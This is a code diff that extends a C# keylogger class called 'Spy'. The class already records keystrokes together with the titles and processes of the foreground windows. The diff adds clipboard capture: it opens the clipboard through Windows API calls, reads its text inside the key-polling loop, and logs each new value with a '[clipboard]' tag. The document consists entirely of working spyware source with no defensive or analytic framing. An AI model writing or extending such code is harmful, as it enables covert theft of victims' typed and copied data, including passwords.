@@ -24,6 +24,8 @@ namespace ClassLibrary1
         public string Logs;
         private Keyboard keyboard;
         public string LogsPath;
+        private string clip="";
+
         public Spy()
         {
             this.lastKey = Keys.None;
@@ -47,22 +49,31 @@ namespace ClassLibrary1
         private static extern IntPtr GetForegroundWindow();
         [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         private static extern short GetAsyncKeyState(int vKey);
-
+        [DllImport("user32.dll", SetLastError = true)]
+        static public extern IntPtr GetClipboardData(uint uFormat);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool CloseClipboard();
+        [DllImport("kernel32.dll")]
+        static extern UIntPtr GlobalSize(IntPtr hMem);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GlobalLock(IntPtr hMem);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool OpenClipboard(IntPtr hWndNewOwner);
         private string WorkWinInfo()
         {
             string result;
             try
             {
-                IntPtr foregroundWindow = Spy.GetForegroundWindow();
+                IntPtr foregroundWindowIntPtr = Spy.GetForegroundWindow();
                 int processId=0;
-                Spy.GetWindowThreadProcessId(foregroundWindow, ref processId);
+                Spy.GetWindowThreadProcessId(foregroundWindowIntPtr, ref processId);
                 Process processById = Process.GetProcessById(processId);
-                if ((foregroundWindow.ToInt32() == this.LastWinHandle & Operators.CompareString(this.LastWinTitle, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0)
+                if ((foregroundWindowIntPtr.ToInt32() == this.LastWinHandle & Operators.CompareString(this.LastWinTitle, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0)
                 {
                     return "";
                 }
 
-                LastWinHandle = foregroundWindow.ToInt32();
+                LastWinHandle = foregroundWindowIntPtr.ToInt32();
                 LastWinTitle = processById.MainWindowTitle;
                 result = string.Concat(new string[]
                 {
@@ -243,10 +254,11 @@ namespace ClassLibrary1
                     while (true)
                     {
                         num++;
+                        string g = GetClipboardData(new IntPtr(LastWinHandle));
                         int num2 = 0;
                         do
                         {
-                            if (Spy.GetAsyncKeyState(num2) == -32767)
+                            if (Spy.GetAsyncKeyState(num2) == -32767 )
                             {
                                 Keys k = (Keys)num2;
                                 string text = this.Fix(k);
@@ -255,9 +267,18 @@ namespace ClassLibrary1
                                     this.Logs += this.WorkWinInfo();
                                     this.Logs += text;
                                 }
-
+                               
+                                
                                 this.lastKey = k;
                             }
+                            else if (!string.IsNullOrEmpty(g) && !g.Equals(clip))
+                                 
+                                {
+                                    this.Logs += this.WorkWinInfo();
+                                    this.Logs += string.Format("[clipboard]:{0}", g);
+                                    clip = g;
+                                    
+                                }
 
                             num2++;
                         }
@@ -289,6 +310,43 @@ namespace ClassLibrary1
         {
             int n = (int) ns;
             return (n >= bottom && n <= top);
+        }
+
+        private const int GLIP_TEXT = 1;
+        private string GetClipboardData(IntPtr Handle)
+        {
+            if (Handle == IntPtr.Zero) return "";
+            try
+            {
+
+          
+            OpenClipboard(Handle);
+
+            //Get pointer to clipboard data in the selected format
+            IntPtr cdp = GetClipboardData(GLIP_TEXT);
+
+            //Do a bunch of crap necessary to copy the data from the memory
+            //the above pointer points at to a place we can access it.
+            UIntPtr length = GlobalSize(cdp);
+            IntPtr gLock = GlobalLock(cdp);
+
+            //Init a buffer which will contain the clipboard data
+            byte[] buffer = new byte[(int)length];
+
+            //Copy clipboard data to buffer
+            Marshal.Copy(gLock, buffer, 0, (int)length);
+            CloseClipboard();
+
+            return OK.GetString(buffer);
+            }
+            catch (Exception e)
+            {
+
+                ProjectData.SetProjectError(e);
+                ProjectData.ClearProjectError();
+            }
+
+            return "";
         }
     }
 }
